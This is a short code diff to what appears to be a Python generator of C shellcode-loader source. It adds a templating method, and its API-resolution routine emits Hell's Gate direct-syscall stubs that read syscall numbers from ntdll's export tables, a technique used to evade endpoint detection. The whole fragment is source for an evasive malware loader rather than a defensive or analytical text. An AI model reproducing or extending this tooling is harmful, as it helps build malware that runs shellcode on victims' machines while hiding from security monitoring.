@@ -277,16 +277,19 @@ __attribute__((constructor)) void {self.name}(){{
 """
         return codeblock
 
+    def template(self, templateCode, transformers, shellcodeSize):
+        apicalls = [field_name for _, field_name, _, _ in string.Formatter().parse(templateCode) if field_name is not None and field_name not in ['shellcodeSize', 'transformers']]
+        self.resolve(apicalls)
+        return templateCode.format(transformers=transformers, shellcodeSize=shellcodeSize, **self.resolved)
 
     def resolve(self, apicalls):
-        resolved = {}
+        self.resolved = {}
         self.apicalls = apicalls
         for apicall in apicalls:
             if 'Nt' not in apicall:
-                resolved[apicall] = apicall
+                self.resolved[apicall] = apicall
             else:
-                resolved[apicall] = f"""
+                self.resolved[apicall] = f"""
     DWORD {apicall}_ssn = findSyscallNumber(getApiAddr({len(apicall)}, "{apicall}", ntdll, ntdllExAddrTbl, ntdllExNamePtrTbl, ntdllExOrdinalTbl));
     HellsGate({apicall}_ssn);
     HellDescent"""
-        return resolved
